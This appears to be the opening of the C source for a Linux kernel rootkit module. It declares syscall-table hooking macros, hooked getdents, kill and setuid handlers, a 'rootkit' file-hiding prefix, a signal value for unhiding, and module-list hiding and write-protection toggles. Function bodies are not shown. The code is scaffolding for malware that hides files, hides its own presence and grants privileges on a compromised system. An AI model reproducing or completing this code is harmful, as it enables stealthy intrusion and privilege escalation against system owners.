#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

#define HIDDEN_FILE_PREFIX "rootkit"
#define UNHIDE 420

//copied from "man 2 getdents"
struct linux_dirent {
  long           d_ino;
  off_t          d_off;
  unsigned short d_reclen;
  char           d_name[];
};

#define HOOK(call_table, orig, newfun, index)	\
  orig = (void *)call_table[index];		\
  call_table[index] = (unsigned long)newfun

#define UNHOOK(call_table, orig, index)		\
  call_table[index] = (unsigned long)orig

static int rootkit_init(void);
static void rootkit_exit(void);
static void disable_rw(void);
static void enable_rw(void);
static void hide(void);
static void unhide(void);

static asmlinkage long (*old_getdents)(unsigned int fd,
				struct linux_dirent __user *dirp,
				unsigned int count);
static asmlinkage long (*old_kill)(pid_t pid, int sig);

static asmlinkage long rootkit_getdents(unsigned int fd,
				 struct linux_dirent __user *dirp,
				 unsigned int count);


static asmlinkage long rootkit_setuid(uid_t uid);
static long rootkit_ls_filter(struct linux_dirent __user *dirp, long length);
static asmlinkage long rootkit_getdents(unsigned int fd,
				 struct linux_dirent __user *dirp,
				 unsigned int count);
static asmlinkage long rootkit_kill(pid_t pid, int sig);

static unsigned long *sys_call_table;
static struct list_head *module_previous;
